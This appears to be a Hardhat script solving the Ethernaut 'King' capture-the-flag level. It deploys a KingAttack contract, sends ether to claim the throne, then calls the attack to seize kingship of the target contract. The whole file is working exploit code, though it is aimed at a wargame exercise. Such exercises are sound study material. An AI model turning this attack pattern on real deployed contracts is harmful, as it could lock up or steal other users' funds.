
const { ethers, waffle } = require("hardhat");

const CONTRACT_ADDRESS = "0xbb55fe723929CcB45a12C03fc91EBeD5407C8a6A"; // get from browser console
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f"; // change to your own address

async function main() {

    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("King", CONTRACT_ADDRESS, signer)

    // get current owner
    const owner = await contract.owner()
    console.log(`owner is ${owner}`)
    const prize0 = await contract.prize()
    console.log(`prize is ${prize0}`)
    const king = await contract._king()
    console.log(`king is ${king}`)

    // deploy attack contract
    const KingAttackFactory = await ethers.getContractFactory("KingAttack")
    const kingAttack = await KingAttackFactory.deploy()
    await kingAttack.deployed()
    console.log(`attack Address : ${kingAttack.address}`)

    // aquire the king 
    await signer.sendTransaction({ to: CONTRACT_ADDRESS, value: ethers.utils.parseEther('1.0') })
    const prize = await contract.prize()
    console.log(`prize is ${prize}`)
    const king1 = await contract._king()
    console.log(`king is ${king1}`)

    // call the attack contract
    await kingAttack.attack(CONTRACT_ADDRESS, { value: ethers.utils.parseEther('1.0') })

    const king2 = await contract._king()
    console.log(`king is ${king2}`)

}

main().catch((error) => {
    console.error(error);
    // eslint-disable-next-line no-process-exit
    process.exit(1);

});